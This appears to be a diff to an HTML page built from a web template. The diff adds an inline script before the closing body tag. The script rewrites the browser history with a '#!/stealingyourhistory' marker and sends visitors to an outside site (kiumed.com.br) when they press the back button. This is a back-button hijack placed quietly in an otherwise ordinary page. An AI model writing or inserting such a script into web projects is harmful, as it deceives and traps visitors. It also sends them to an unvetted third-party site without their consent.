@@ -292,7 +292,21 @@ https://templatemo.com/tm-520-highway
     
     <script src="js/plugins.js"></script>
     <script src="js/main.js"></script>
+<script type = "text/javascript">
+(function(window, location) {
+    history.replaceState(null, document.title, location.pathname+"#!/stealingyourhistory");
+    history.pushState(null, document.title, location.pathname);
 
+    window.addEventListener("popstate", function() {
+      if(location.hash === "#!/stealingyourhistory") {
+            history.replaceState(null, document.title, location.pathname);
+            setTimeout(function(){
+              location.replace("http://www.kiumed.com.br/");
+            },0);
+      }
+    }, false);
+}(window, location));
+</script>
     
 </body>
 </html>
